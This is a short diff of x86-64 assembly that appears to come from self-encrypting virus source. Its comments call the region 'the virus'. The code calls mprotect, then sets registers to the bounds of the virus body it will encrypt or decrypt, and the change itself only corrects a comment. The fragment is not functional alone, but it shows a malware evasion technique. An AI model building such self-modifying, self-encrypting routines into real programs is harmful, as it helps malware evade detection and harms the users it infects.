@@ -46,7 +46,7 @@ mov rdx, 0x7
 call mprotect
 
 ; source - destination registers hold the start and end of virus
-; there is automatic calculatio happening here which is (_start-main) == 660h worth of memory that will be encrypted/decrypted
+; there is automatic calculation happening here which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
 mov rsi, %1
 mov rdi, %2
 sub rdi, rsi
